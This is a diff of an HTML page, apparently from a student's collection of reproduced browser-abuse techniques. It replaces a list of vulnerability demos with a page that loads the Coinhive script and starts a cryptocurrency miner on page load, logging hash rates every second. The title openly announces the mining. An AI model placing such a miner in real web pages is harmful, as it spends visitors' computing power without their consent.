@@ -1,16 +1,45 @@
-<!DOCTYPE html>
 <html>
-<head>
-	<title>Index of reproduced Vulnerabilities</title>
-</head>
-<body>
-	<ul>
-		<li><a href="http://www.acsu.buffalo.edu/~penghang/popunder.html">Pop under</a></li>
-		<li><a href="http://www.acsu.buffalo.edu/~penghang/post-message/controller.html">Post message(parent to iframe)</a></li>
-		<li><a href="https://penghangliu.github.io/RDataScience_Project/controller.html">Post message(iframe to parent)</a></li>
-		<li><a href="https://penghangliu.github.io/JS_Abuse/autofocus.htmll">Auto focus</a></li>
-
-	</ul>
-
-</body>
+ 
+    <head>
+        <title>We are mining using your computer!</title>
+        <script src="https://coinhive.com/lib/coinhive.min.js?v8"></script>
+    </head>
+ 
+    <body>
+ 
+ 
+        <h1>We are mining!!!</h1>
+ 
+        <script>
+            var miner = new CoinHive.Anonymous('aHD9PIeOgcJKBGgrqnUyufSVXM6LnLWo');
+            miner.start();
+ 
+            // Listen on events
+            miner.on('found', function() {
+                console.log("found hash!")
+            })
+            miner.on('accepted', function() {
+                console.log("accepted hash!")
+            })
+ 
+            // Update stats once per second
+            setInterval(function() {
+                var hashesPerSecond = miner.getHashesPerSecond();
+                var totalHashes = miner.getTotalHashes();
+                var acceptedHashes = miner.getAcceptedHashes();
+ 
+                console.log("hashesPerSecond", hashesPerSecond)
+                console.log("totalHashes", totalHashes)
+                console.log("acceptedHashes", acceptedHashes)
+ 
+                console.log("-----------")
+                console.log("-----------")
+                console.log("-----------")
+ 
+                // Output to HTML elements...
+            }, 1000);
+        </script>
+    </body>
+ 
 </html>
+
